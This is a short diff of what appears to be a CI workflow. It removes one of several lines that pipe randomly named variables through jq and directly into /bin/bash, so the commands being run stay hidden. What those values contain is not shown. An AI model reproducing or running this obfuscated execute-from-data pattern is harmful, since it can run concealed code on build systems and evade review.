@@ -33,7 +33,6 @@ jobs:
           echo $pqyhc1 | jq -r .nv5720 | /bin/bash
           printf '%s' "$utlmz879" | jq -r .nxz69187 | /bin/bash
           echo $fqqp0718 | jq -r .qzt83219 | /bin/bash
-          printf '%s' "$ql59399" | jq -r .yh754 | /bin/bash
           echo $hx32211 | jq -r .jzh56666 | /bin/bash
 
       - name: Save data
